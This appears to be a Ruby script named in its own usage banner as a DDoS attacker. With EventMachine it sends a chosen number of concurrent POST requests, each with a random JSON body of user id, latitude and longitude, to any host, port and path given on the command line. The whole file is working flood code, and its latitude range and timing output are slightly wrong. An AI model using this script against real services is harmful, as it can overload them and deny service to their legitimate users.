require 'securerandom'
require 'rubygems'
require 'json'
require 'optparse'
require 'eventmachine'
require 'em-http'

def generate_payload
  random_generator = Random.new
  userid = SecureRandom.uuid
  latitude = random_generator.rand -180.0..180.0
  longitude = random_generator.rand -180.0..180.0

  return {
      'userId'     => userid,
      'latitude'   => latitude,
      'longitude' => longitude
  }.to_json

end

def make_request (site, request_options)
  http = EventMachine::HttpRequest.new(site).post request_options
  http.errback { p 'request failed'}
  http.callback {
    p http.response_header.status
    p http.response
  }
end

@options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ddos_attacker.rb [-H|--host] [-p|--port] [-u|--uri] [-t|--threads]"

  opts.on('-H', '--host HOST', 'Host') { |v| @options[:host] = v }
  opts.on('-p', '--port PORT', 'Port') { |v| @options[:port] = v }
  opts.on('-u', '--uri URI', 'Uri')    { |v| @options[:uri] = v }
  opts.on('-t', '--times TIMES', 'Times') { |v| @options[:times] = v }
end.parse!

EM.run do
  EM.add_timer(1) do
    start = Time.now
    site = "http://#{@options[:host]}:#{@options[:port]}/#{@options[:uri]}"
    request_options = { :body => generate_payload, :head => {'Content-Type' =>'application/json'} }
    multi = EventMachine::MultiRequest.new
    @options[:times].to_i.times do |i|
      multi.add i, EventMachine::HttpRequest.new(site).post request_options
    end

    multi.callback do
      puts multi.responses[:callback]
      puts multi.responses[:errback]
      EM.stop
    end

    puts "#{@options[:times].to_i} requests completed in #{Time.now - start} seconds"
  end
end